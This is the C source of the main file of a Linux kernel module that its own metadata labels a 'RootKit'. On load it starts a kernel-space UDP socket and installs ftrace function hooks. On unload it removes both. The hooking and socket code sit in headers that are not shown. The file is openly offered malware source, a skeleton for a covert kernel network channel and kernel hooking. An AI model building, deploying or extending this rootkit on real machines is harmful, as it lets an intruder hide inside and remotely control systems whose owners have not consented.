#include <linux/module.h>
#include <linux/kernel.h>  // For printk
#include "com/headers/udp_server.h"
#include "hooks/headers/ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("2600");
MODULE_DESCRIPTION("RootKit");
MODULE_VERSION("0.1");

// Initialization function
static int __init start_module(void) {
    printk(KERN_INFO "INIT\n");
    ksocket_init();

    // Start Hooking 
    install_hook();

    return 0;  // Return 0 to indicate successful initialization
}

// Cleanup function
static void __exit exit_module(void) {
    printk(KERN_INFO "Exit\n");
    ksocket_exit();
    exit_hook();
}

module_init(start_module);  // Register the initialization function
module_exit(exit_module);    // Register the cleanup function
